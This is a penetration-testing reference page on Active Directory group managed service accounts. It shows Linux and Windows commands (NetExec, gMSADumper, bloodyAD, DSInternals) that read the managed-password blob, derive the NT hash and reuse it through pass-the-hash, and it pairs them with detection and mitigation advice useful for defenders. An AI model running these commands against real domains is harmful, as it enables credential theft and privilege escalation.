---
title: Group Managed Service Accounts (gMSA)
category: AD / Credentials
order: 50
tags:
  - gmsa
  - dacl-abuse
  - credentials
  - kerberos
  - pass-the-hash
  - bloodhound
summary: Read a gMSA's msDS-ManagedPassword blob when you hold the retrieve right, derive its NT hash, and pass-the-hash as the service account.
prerequisites:
  - Control of a principal listed in the target gMSA's msDS-GroupMSAMembership (a.k.a. PrincipalsAllowedToRetrieveManagedPassword), OR write access to that attribute so you can add yourself
  - LDAP/LDAPS reachability to a domain controller — the password blob is only released over a sealed channel
tools:
  - netexec / nxc
  - gMSADumper.py
  - bloodyAD
  - ldeep
  - GMSAPasswordReader
  - DSInternals
  - RSAT / Get-ADServiceAccount
detection:
  - Event ID 4662 (Audit Directory Service Access) on a SACL that audits reads of msDS-ManagedPassword on gMSA objects
  - A non-computer account reading the managed-password blob is highly abnormal
  - Writes to msDS-GroupMSAMembership (an attacker granting themselves the retrieve right)
mitigation:
  - Scope PrincipalsAllowedToRetrieveManagedPassword to only the exact hosts that run the service
  - Treat the gMSA's derived NT hash as a privileged credential and place the gMSA in the correct admin tier
  - Restrict and monitor who can edit the membership/DACL attribute
refs:
  - label: ADSecurity - Attacking gMSAs (Sean Metcalf)
    url: https://adsecurity.org/?p=4367
  - label: DSInternals - Retrieving Cleartext gMSA Passwords
    url: https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/
  - label: The Hacker Recipes - ReadGMSAPassword
    url: https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
  - label: gMSADumper (micahvandeusen)
    url: https://github.com/micahvandeusen/gMSADumper
  - label: BloodHound - ReadGMSAPassword edge
    url: https://bloodhound.specterops.io/resources/edges/read-gmsa-password
  - label: InternalAllTheThings - Read gMSA password
    url: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/
---

## What a gMSA is

A Group Managed Service Account is an AD-managed service identity (Server 2012+). Its password is generated and rotated automatically by the domain controllers (every 30 days by default) via the Key Distribution Service (KDS) — no human or app ever needs to know it. The application host simply asks AD for the current password when the service starts. Think of it as a service account where AD, not a person, owns the password.

## The secret: msDS-ManagedPassword

`msDS-ManagedPassword` is a *constructed* (calculated) LDAP attribute — it is not stored on disk like a normal password hash. When queried, the DC returns an `MSDS-MANAGEDPASSWORD_BLOB` containing the **current and previous cleartext passwords** (a ~240/256-byte random value) plus rotation timestamps.

The key insight for an attacker: because the gMSA never "types" a password, its **NT hash is just the MD4 of that cleartext blob**. So reading the blob is equivalent to owning the account's NT hash — usable for pass-the-hash, overpass-the-hash (request a TGT), or silver tickets.

The DC only returns the blob to principals listed in the gMSA's `msDS-GroupMSAMembership` attribute, and only over a sealed / LDAPS channel.

## The "ReadGMSAPassword" right

Holding this right = being a principal in `msDS-GroupMSAMembership` (surfaced in PowerShell as `PrincipalsAllowedToRetrieveManagedPassword`). BloodHound models it as the **ReadGMSAPassword** edge. If you control such a principal — or can write that attribute to add yourself — you can pull the password. It is a common privilege-escalation stepping stone, because the gMSA often has more rights than the account you started from.

## Read it and derive the NT hash (Linux)

```sh
# NetExec — LDAPS is auto-selected for --gmsa; prints account + NT hash
nxc ldap $dc_host -u $user -p $password --gmsa

# gMSADumper — lists who CAN read, then parses blobs to NTLM + AES keys
python3 gMSADumper.py -u $user -p $password -d $domain
python3 gMSADumper.py -u $user -p <NTLMHASH> -d $domain -l $dc_host   # pass-the-hash
python3 gMSADumper.py -k -d $domain -l $dc_host                       # kerberos

# bloodyAD — read the blob directly
bloodyAD --host $dc_ip -d $domain -u $user -p $password get search \
  --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword

# bloodyAD — with --resolve-sd to SEE who holds the retrieve right
bloodyAD --host $dc_ip -d $domain -u $user -p $password get object \
  '<gMSA-DN>' --attr msDS-GroupMSAMembership --resolve-sd
```

## Read it (Windows)

```powershell
# GMSAPasswordReader (C#)
GMSAPasswordReader.exe --accountname svc_gmsa

# Native + DSInternals: blob -> cleartext -> NT hash
$g  = Get-ADServiceAccount svc_gmsa -Properties msDS-ManagedPassword
$mp = ConvertFrom-ADManagedPasswordBlob $g.'msDS-ManagedPassword'
ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```

Then pass-the-hash, or request a TGT as the gMSA (overpass-the-hash) and use its service privileges.

## Prerequisites

- Control of a principal in `PrincipalsAllowedToRetrieveManagedPassword` (or write access to add one).
- LDAP/LDAPS connectivity to a DC (the blob is only returned over a sealed channel — this is why `--gmsa` forces LDAPS).

## Detection

- Enable **Audit Directory Service Access** and put a **SACL** on the gMSA objects auditing reads of `msDS-ManagedPassword`; reads then raise **Event ID 4662**. A *non-computer* account reading the blob is a strong signal.
- Alert on writes to `msDS-GroupMSAMembership`.

## Mitigation

- Scope `PrincipalsAllowedToRetrieveManagedPassword` to only the exact hosts running the service.
- Treat the derived NT hash as a privileged credential; tier the gMSA correctly.
- Monitor and restrict who can edit the membership attribute / object DACL.
